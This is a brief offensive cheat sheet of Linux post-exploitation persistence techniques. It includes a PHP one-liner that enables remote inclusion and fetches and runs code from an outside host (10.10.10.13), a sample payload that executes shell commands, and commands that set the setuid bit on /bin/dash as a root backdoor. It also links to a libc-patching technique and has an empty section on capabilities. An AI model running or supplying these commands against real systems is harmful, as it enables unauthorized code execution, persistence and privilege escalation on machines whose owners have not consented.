## PHP Persistence
Run the following
```bash
php -d allow_url_include=1 -r 'include_once("http://10.10.10.13/hw.php")'
```

`hw.php` Contents
```php
<?php echo("Hello World\n"); ?>
<?php system('whoami'); ?>
```

## Patching LibC
[Linux Internals: How /proc/self/mem writes to unwritable memory - offlinemark](https://offlinemark.com/2021/05/12/an-obscure-quirk-of-proc/)

## Set the setuid bit for `sh` or any binary
```bash
# 1. Find where /bin/sh links to
ls -la /bin/sh

# 2. Set the setuid bit for binary
chmod 4755 /bin/dash

# 3. Check if the bit is set
ls -la /bin/dash
```

## Capabilities 
// TODO